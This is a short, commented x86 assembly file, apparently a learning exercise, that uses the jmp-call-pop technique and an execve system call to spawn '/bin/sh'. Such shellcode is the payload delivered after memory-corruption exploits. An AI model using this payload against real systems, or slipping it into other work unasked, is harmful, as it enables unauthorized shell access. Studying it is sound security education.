global _start

section .text

	_start:
	
		jmp callback

	spawnshell:
	
		; pop the address of our "/bin/sh" string into esi
		pop esi

		; create the arg array to feed to execve
		push 0x0
		push esi

		; set execve parameters
		xor edx, edx
		mov ecx, esp
		mov ebx, esi

		; invoke execve system call
		mov eax, 0xb
		int 0x80
	
		; if we've made it this far, then execve has failed and 
		; we need to exit gracefully
		xor ebx, ebx
		mov eax, 0x1
		int 0x80
	
	
	callback:
	
		; when we call spawnshell, the address of "/bin/sh" string
		; is pushed onto the stack, so we can access it by 
		; popping esi in spawnshell
		call spawnshell
		db "/bin/sh",0
